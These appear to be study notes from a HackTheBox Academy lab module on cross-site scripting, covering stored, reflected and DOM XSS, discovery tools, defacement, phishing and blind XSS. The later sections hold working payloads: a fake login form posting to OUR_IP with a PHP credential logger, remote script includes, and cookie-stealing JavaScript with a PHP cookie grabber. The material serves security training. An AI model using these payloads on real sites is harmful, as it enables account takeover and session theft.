
            As XSS attacks execute JavaScript code within the browser, they are limited to the browser's JS engine (i.e., V8 in Chrome). They cannot execute system-wide JavaScript code to do something like system-level code execution. In modern browsers, they are also limited to the same domain of the vulnerable website. Nevertheless, being able to execute JavaScript in a user's browser may still lead to a wide variety of attacks



            Type 	            Description
Stored (Persistent) XSS 	        The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)


Reflected (Non-Persistent) XSS 	    Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)


DOM-based XSS 	                    Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags).





        --Stored XSS (PErsistent)


         If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.

        <script>alert(window.origin)</script>


        Tip: Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of window.origin in the alert box, instead of a static value like 1. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.




        ---Reflected XSS

        There are two types of Non-Persistent XSS vulnerabilities: Reflected XSS, which gets processed by the back-end server, and DOM-based XSS, which is completely processed on the client-side and never reaches the back-end server. Unlike Persistent XSS, Non-Persistent XSS vulnerabilities are temporary and are not persistent through page refreshes. Hence, our attacks only affect the targeted user and will not affect other users who visit the page.

        Reflected XSS vulnerabilities occur when our input reaches the back-end server and gets returned to us without being filtered or sanitized. There are many cases in which our entire input might get returned to us, like error messages or confirmation messages. In these cases, we may attempt using XSS payloads to see whether they execute. However, as these are usually temporary messages, once we move from the page, they would not execute again, and hence they are Non-Persistent.



        ---DOM XSS


        While reflected XSS sends the input data to the back-end server through HTTP requests, DOM XSS is completely processed on the client-side through JavaScript. DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM).

        We see that the input parameter in the URL is using a hashtag # for the item we added, which means that this is a client-side parameter that is completely processed on the browser.

         This indicates that the input is being processed at the client-side through JavaScript and never reaches the back-end; hence it is a DOM-based XSS.



        /Source & Sink

        To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the Source and Sink of the object displayed on the page. The Source is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.

        On the other hand, the Sink is the function that writes the user input to a DOM Object on the page. If the Sink function does not properly sanitize the user input, it would be vulnerable to an XSS attack. Some of the commonly used JavaScript functions to write to DOM objects are:

            document.write()
            DOM.innerHTML
            DOM.outerHTML


        Furthermore, some of the jQuery library functions that write to DOM objects are:

            add()
            after()
            append()

        
        We can look at the source code of the To-Do web application, and check script.js, and we will see that the Source is being taken from the task= parameter:

        var pos = document.URL.indexOf("task=");
        var task = document.URL.substring(pos + 5, document.URL.length);


        Right below these lines, we see that the page uses the innerHTML function to write the task variable in the todo DOM:

        document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);



        /DOM Attacks

        If we try the XSS payload we have been using previously, we will see that it will not execute. This is because the innerHTML function does not allow the use of the <script> tags within it as a security feature. Still, there are many other XSS payloads we use that do not contain <script> tags, like the following XSS payload:

        <img src="" onerror=alert(window.origin)>





        --Discovery


        -Automated 

        Almost all Web Application Vulnerability Scanners (like Nessus, Burp Pro, or ZAP) have various capabilities for detecting all three types of XSS vulnerabilities.

        Some of the common open-source tools that can assist us in XSS discovery are XSS Strike, Brute XSS, and XSSer. We can try XSS Strike by cloning it to our VM with git clone:

        $ git clone https://github.com/s0md3v/XSStrike.git

        $ cd XSStrike

        $ pip install -r requirements.txt

        $ python xsstrike.py


        $ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 




        -Manual Discovery


         We can find huge lists of XSS payloads online, like the one on PayloadAllTheThings or the one in PayloadBox. We can then begin testing these payloads one by one by copying each one and adding it in our form, and seeing whether an alert box pops up.

         Note: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in HTTP headers like the Cookie or User-Agent (i.e., when their values are displayed on the page).



         -Code Review

         The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both back-end and front-end code. If we understand precisely how our input is being handled all the way until it reaches the web browser, we can write a custom payload that should work with high confidence.






         ---Defacing

         One of the most common attacks usually used with stored XSS vulnerabilities is website defacing attacks. Defacing a website means changing its look for anyone who visits the website. It is very common for hacker groups to deface a website to claim that they had successfully hacked it


         -Defacement Elements

         Three HTML elements are usually utilized to change the main look of a web page:

        Three HTML elements are usually utilized to change the main look of a web page:

            Background Color document.body.style.background
            Background document.body.background
            Page Title document.title
            Page Text DOM.innerHTML



        -Changing Background

        <script>document.body.style.background = "#141d2b"</script>


        This will be persistent through page refreshes and will appear for anyone who visits the page, as we are utilizing a stored XSS vulnerability.


        set an image to the background using the following payload

        <script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>


        -Changing Page Title

        <script>document.title = 'HackTheBox Academy'</script>



        -Changing Page Text

        document.getElementById("todo").innerHTML = "New Text"


        We can also utilize jQuery functions for more efficiently achieving the same thing or for changing the text of multiple elements in one line (to do so, the jQuery library must have been imported within the page source):

        $("#todo").html('New Text');

        change the entire HTML code of the main body, using innerHTML, as follows:

        document.getElementsByTagName('body')[0].innerHTML = "New Text"


        As we can see, we can specify the body element with document.getElementsByTagName('body'), and by specifying [0], we are selecting the first body element, which should change the entire text of the web page. We may also use jQuery to achieve the same thing. However, before sending our payload and making a permanent change, we should prepare our HTML code separately and then use innerHTML to set our HTML code to the page source.


        <center>
            <h1 style="color: white">Cyber Security Training</h1>
                <p style="color: white">by 
                    <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
                </p>
        </center>

        
        We will minify the HTML code into a single line and add it to our previous XSS payload.

        By using three XSS payloads, we were able to successfully deface our target web page. If we look at the source code of the web page, we will see the original source code still exists, and our injected payloads appear at the end

        This is because our injected JavaScript code changes the look of the page when it gets executed, which in this case, is at the end of the source code. If our injection was in an element in the middle of the source code, then other scripts or elements may get added to after it, so we would have to account for them to get the final look we need.





        --Phishing


        A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.


        -XSS Discovery


        Tip: To understand which payload should work, try to view how your input is displayed in the HTML source after you add it.


        -Login Form Injection

         To perform an XSS phishing attack, we must inject an HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.


         <h3>Please login to continue</h3>
        <form action=http://OUR_IP>
            <input type="username" name="username" placeholder="Username">
            <input type="password" name="password" placeholder="Password">
            <input type="submit" name="submit" value="Login">
        </form>



         The login form should look as follows:

         <div>
        <h3>Please login to continue</h3>
        <input type="text" placeholder="Username">
        <input type="text" placeholder="Password">
        <input type="submit" value="Login">
        <br><br>
        </div>


        Next, we should prepare our XSS code and test it on the vulnerable form. To write HTML code to the vulnerable page, we can use the JavaScript function document.write(), and use it in the XSS payload we found earlier in the XSS Discovery step. Once we minify our HTML code into a single line and add it inside the write function, the final JavaScript code should be as follows:


        document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');


         In this case, we are exploiting a Reflected XSS vulnerability, so we can copy the URL and our XSS payload in its parameters, as we've done in the Reflected XSS section, and the page should look as follows when we visit the malicious URL


         We can see that the URL field is still displayed, which defeats our line of "Please login to continue". So, to encourage the victim to use the login form, we should remove the URL field, such that they may think that they have to log in to be able to use the page. To do so, we can use the JavaScript function document.getElementById().remove() function.


         To find the id of the HTML element we want to remove, we can open the Page Inspector Picker by clicking [CTRL+SHIFT+C] and then clicking on the element we need: 


         So, we can now use this id with the remove() function to remove the URL form:

         document.getElementById('urlform').remove();

        
        We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload:

        ...PAYLOAD... <!-- 




        -Credential Stealing

        So, let us start a simple netcat server and see what kind of request we get when someone attempts to log in through the form. To do so, we can start listening on port 80 in our Pwnbox, as follows:


        $ sudo nc -lvnp 80

        we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.

        <?php
        if (isset($_GET['username']) && isset($_GET['password'])) {
            $file = fopen("creds.txt", "a+");
            fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
            header("Location: http://SERVER_IP/phishing/index.php");
            fclose($file);
            exit();
        }
        ?>


        $ sudo php -S 0.0.0.0:80





                    ///Session Hijacking



        --Blind XSS Detection

        A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.

        Blind XSS vulnerabilities usually occur with forms only accessible by certain users (e.g., Admins). Some potential examples include:

            Contact Forms
            Reviews
            User Details
            Support Tickets
            HTTP User-Agent header

        
        In normal (i.e., non-blind) cases, we can test each field until we get an alert box, like what we've been doing throughout the module. However, as we do not have access over the Admin panel in this case, how would we be able to detect an XSS vulnerability if we cannot see how the output is handled?


        To do so, we can use the same trick we used in the previous section, which is to use a JavaScript payload that sends an HTTP request back to our server. If the JavaScript code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.


        However, this introduces two issues:

        How can we know which specific field is vulnerable? Since any of the fields may execute our code, we can't know which of them did.
       
        How can we know what XSS payload to use? Since the page may be vulnerable, but the payload may not work?



        -Loading a Remote Script

        In HTML, we can write JavaScript code within the <script> tags, but we can also include a remote script by providing its URL, as follows:

        <script src="http://OUR_IP/script.js"></script>


        So, we can use this to execute a remote JavaScript file that is served on our VM. We can change the requested script name from script.js to the name of the field we are injecting in, such that when we get the request in our VM, we can identify the vulnerable input field that executed the script, as follows:


        <script src="http://OUR_IP/username"></script>


        As we can see, various payloads start with an injection like '>, which may or may not work depending on how our input is handled in the backend. As previously mentioned in the XSS Discovery section, if we had access to the source code (i.e., in a DOM XSS), it would be possible to precisely write the required payload for a successful injection. This is why Blind XSS has a higher success rate with DOM XSS type of vulnerabilities.

        $ sudo php -S 0.0.0.0:80

        Now we can start testing these payloads one by one by using one of them for all of input fields and appending the name of the field after our IP, as mentioned earlier, like:

        <script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
        <script src=http://OUR_IP/username></script> #this goes inside the username field
        
        Tip: We will notice that the email must match an email format, even if we try manipulating the HTTP request parameters, as it seems to be validated on both the front-end and the back-end. Hence, the email field is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.

        Once we submit the form, we wait a few seconds and check our terminal to see if anything called our server. If nothing calls our server, then we can proceed to the next payload, and so on. Once we receive a call to our server, we should note the last XSS payload we used as a working payload and note the input field name that called our server as the vulnerable input field.


        Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a Session Hijacking attack.

        It requires a JavaScript payload to send us the required data and a PHP script hosted on our server to grab and parse the transmitted data.

        document.location='http://OUR_IP/index.php?c='+document.cookie;
        new Image().src='http://OUR_IP/index.php?c='+document.cookie;

        Using any of the two payloads should work in sending us a cookie, but we'll use the second one, as it simply adds an image to the page, which may not be very malicious looking, while the first navigates to our cookie grabber PHP page, which may look suspicious.

        We can write any of these JavaScript payloads to script.js, which will be hosted on our VM as well:

        new Image().src='http://OUR_IP/index.php?c='+document.cookie


        Now, we can change the URL in the XSS payload we found earlier to use script.js (don't forget to replace OUR_IP with your VM IP in the JS script and the XSS payload):


        <script src=http://OUR_IP/script.js></script>


        With our PHP server running, we can now use the code as part of our XSS payload, send it in the vulnerable input field, and we should get a call to our server with the cookie value. However, if there were many cookies, we may not know which cookie value belongs to which cookie header. So, we can write a PHP script to split them with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.


        We can save the following PHP script as index.php, and re-run the PHP server again


        <?php
        if (isset($_GET['c'])) {
            $list = explode(";", $_GET['c']);
            foreach ($list as $key => $value) { 
                    $cookie = urldecode($value);
                    $file = fopen("cookies.txt", "a+");
                    fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
                    fclose($file);
                }
            }
            ?>


        Now, we wait for the victim to visit the vulnerable page and view our XSS payload. Once they do, we will get two requests on our server, one for script.js, which in turn will make another request with the cookie value:


        10.10.10.10:52798 [200]: /script.js
        10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2


        